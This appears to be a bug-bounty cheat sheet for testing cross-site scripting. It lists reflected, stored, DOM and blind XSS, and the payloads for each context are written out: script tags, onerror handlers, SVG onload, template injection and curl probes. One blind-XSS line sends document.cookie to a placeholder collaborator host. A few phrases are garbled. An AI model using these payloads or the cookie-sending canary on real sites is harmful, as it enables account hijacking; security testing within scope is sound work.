# HOW TO TEST XSS ON A TARGET (2026 expert guide)
# Subject to the program rules & "XSS" scope; these are validation steps, not mass-exploit notes.

## The N ways to test
1. Reflected: input echoed unencoded in HTML, attribute, URL, or JS context.
2. Stored: comment/profile/message that later renders to other users (impact escalates).
3. DOM: client-side JS sink (innerHTML, document.write, eval, location) without sanitize.
4. mXSS / clobbering: browsers re-serialize DOM parsing (see dom-clobbering-mxss-2026.txt).
5. Handler context: onmouseover=, onerror= in img/svg/picture.
6. Template/SSR context: Vue/React props, mismatch between server-escape and client-render
   (see framework-matrix-2026.txt).
7. Blind: input stored and executed from a <script> in an admin/bot page (use a canary that calls out).
8. Uploads: HTML/SVG/PDF-hosting files (svg-image-xss-payloads.txt).

## The build-your-own-context ladder (the expert path)
1. Send a unique token and grep WHERE it lands (body attribute / JS string / CSS / comment).
2. Break out minimal at the exact delimiter:
   - HTML text:  <script>alert(document.domain)</script>
   - attribute:  "><img src=x onerror=alert(1)>
   - JS string:  ';alert(1)//
   - JS template: ${alert(1)}
   - URL:        javascript:alert(1)  (in href/src).
3. If WAF blocks, walk the XSS WAF bypass file for encoding/entity closes.
4. Verify on TWO browsers (some vectors are browser-specific / moot on modern).

## Worked examples (concrete)
# reflected html:
curl -si "https://target.com/search?q=<script>alert(document.domain)</script>" | grep -i "alert"
# attribute break:
curl -si "https://target.com/search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E" | grep -ic "onerror"
# js string break:
' - alert(document.domain) -
';alert(document.domain)//
# fetch canary for blind XSS (admin/bot reach - scope conditions apply):
'fetch('//YOUR-COLLABORATOR.oast.fun/?c='+btoa(document.cookie))//
# DOM sink (no server reflection! test in browser console / headless):
?name=<img src=x onerror=alert(1)>    -> feeds document.getElementById('n').innerHTML
# upload SVG (if xml parsed as image):
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
# data-uri fallback for some filters:
<a href="data:text/html,<script>alert(1)</script>">click</a>
# throttle check: are two displays interleaved? (mutation XSS - mXSS)
#   dynamic template: do the framework tons via framework-matrix-2026.txt (e.g. Vue {{constructor.constructor('alert(1)')()}})

## False positives
- Cookie/URL encoding of quotes vs injection: confirm the break ACTUALLY changes the DOM (open devtools).
- Proxy discovering an alert executed is proof - the reflection alone isn't.
- Browser-only payloads blocked when CSP is set (report CSP-not-poor too, but XSS only when executed).
